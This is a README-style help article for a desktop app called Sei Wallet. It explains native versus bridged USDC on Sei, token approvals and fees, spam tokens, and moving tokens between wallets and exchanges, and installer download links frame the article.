![Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/raw/main/assets/banner-article.png)

<h1 align="center">USDC and other tokens in Sei Wallet</h1>

<p align="center">Which tokens the app holds, how they differ from SEI, and what to check.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Tokens on Sei are contract balances, not native coins. That single fact explains almost every token problem: why a transfer costs more than a SEI send, why a balance can be missing while the chain says it is there, why an approval can drain a wallet, and why "I received a token I never bought" is a threat rather than a windfall.

USDC deserves its own paragraph because there are two of them in circulation on Sei, and only one is current.

## USDC: native versus the older bridged form

Sei's documentation describes native USDC and Circle's CCTP V2 as supported, with the Noble-issued USDC.n deprecated. Those are different assets with different exit routes:

- **Native USDC** is issued by Circle. It is the one to use, and it is what applications should expect.
- **USDC.n** arrived over IBC from Noble. With IBC disabled in both directions, it remains on Sei and remains transferable within Sei, but it can no longer be redeemed on its origin chain.

If a balance looks like dollars but behaves oddly - no route out, thin liquidity - check which one you hold before assuming a problem with the wallet.

## Why a token transfer is not a SEI transfer

Sending SEI moves the chain's own currency; sending a token asks a contract to rewrite its own ledger. The differences are practical:

| | Native SEI | Token |
|---|---|---|
| Cost | Low | Higher - it is a contract call |
| Recipient check | Address only | Address plus the contract's rules |
| Failure modes | Fee, nonce, network | The above plus contract state |
| Approvals | Not applicable | Central to how it works |

The fee difference is the one people notice. A token transfer costs more because it executes code, and that is also why it can fail in ways a native transfer cannot.

## Approvals, and why they matter more than transfers

To let a contract move your tokens, you approve an allowance. The approval is a separate transaction, it persists, and it is the mechanism behind most token theft.

- **An approval is not a payment.** It grants permission; the transfer happens later, or never.
- **Unlimited approvals are common and dangerous.** Grant the smallest amount that works.
- **Revoke what you no longer use.** A stale approval on an old contract is a standing risk.
- **A "claim" that requires an approval** is the standard shape of an approval drain. Read what the prompt grants, not what the page promises.

The wallet can show you the prompt; it cannot decide for you. This is the same exposure as on any EVM chain, and [a transfer to the wrong contract](https://github.com/sei-chain/sei-wallet-staking/blob/main/sent-to-the-wrong-address.md) covers the case where the signature is already given.

## Adding a token to see its balance

A wallet displays the tokens on its list. Token balances exist on chain whether or not the wallet shows them.

If a token transfer succeeded and nothing appears:

1. Confirm the transaction on an explorer - check the token-transfer entry, not the native value.
2. Confirm the network is 1329.
3. Add the token contract to the wallet, using the address from the issuer or the explorer, never from a message.

A wrong contract address adds a fake token with the right ticker. That is a common trick: the balance looks real, the asset is worthless, and interacting with it is the actual trap.

## Spam tokens and fake airdrops

Unsolicited tokens arrive because anyone can send a contract balance to any address. The safe behaviour is uniform: do not interact.

- **Do not swap it.** The token contract can behave arbitrarily, including taking a fee or reverting in a way that costs you gas.
- **Do not "claim" anything it points to.** The link is the payload.
- **Do not approve it** to see what happens. That is the whole attack.
- **Hiding it is enough.** An unwanted token is clutter, not a compromise.

A balance appearing in your wallet is not evidence that you received value, and it is not evidence that anything is wrong. It is an advertisement with a contract attached.

## Moving tokens between wallets

The mechanics are the same as sending SEI, with two differences: you need gas in native SEI, and the destination must be able to display the token.

If you are moving tokens from Compass or another wallet, [moving tokens off Compass](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md) is the handover, and the address rules are identical to native transfers.

The fee is higher than a SEI send, which matters when you are moving a small balance: the fee can exceed the value. [The fee for a token transfer](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md) explains the gas side.

## Tokens that arrived from an exchange

An exchange withdrawal of USDC or another token may need a memo or tag, and the deposit address may be per-asset. [Deposit fields for tokens](https://github.com/sei-chain/sei-wallet-setup/blob/main/memo-and-tag-for-exchange-deposits.md) covers when a memo is required and what happens when it is missing.

One warning: an exchange that offers "USDC (ERC-20)" is offering a token on Ethereum, not on Sei. Sending it to a Sei address loses it, because it is a different asset on a different chain.

## If a token transfer is stuck

Contract calls can fail on gas, and a token transfer that runs out of gas reverts - the fee is spent, the tokens stay put. That is different from a pending native transfer.

If the transaction is pending rather than failed, it is a fee or nonce question, and [a token transfer that hangs](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) applies. If it failed, read the revert reason before retrying.

## Frequently asked questions

**Is USDC on Sei the same as USDC on Ethereum?** Not the same token contract. Native USDC is issued by Circle on each chain; a bridged form is a claim on a bridge. The older USDC.n is deprecated per Sei's docs.

**Why is my token balance missing?** The wallet has not added the token contract, or you are on another network. The balance is on chain either way.

**Do token transfers cost more than SEI transfers?** Yes. A token transfer executes contract code, so it uses more gas.

**Should I approve unlimited spending?** No. Approve the amount the operation needs, and revoke approvals you no longer use.

**A token appeared that I never bought. Is it worth something?** Assume not. Do not interact with it; interacting is the attack.

**Can I stake a token?** No. Staking applies to native SEI. A bridged or wrapped asset is not stakeable.

**What if I sent a token to the wrong address?** A confirmed transfer is final. If the destination is a contract without a recovery function, it is stuck - the same answer as for native SEI, in the wrong-address case.

**Where do I see my token list?** In [the wallet's token list](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md); if an asset is missing, add its contract from an authoritative source.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Sent SEI to the wrong address from Sei Wallet: what is recoverable](https://github.com/sei-chain/sei-wallet-staking/blob/main/sent-to-the-wrong-address.md)
- [Moving SEI off Compass to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md)
- [Sei gas fees and what Sei Wallet shows before you sign](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md)
- [The Sei memo field and exchange deposits into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/memo-and-tag-for-exchange-deposits.md)
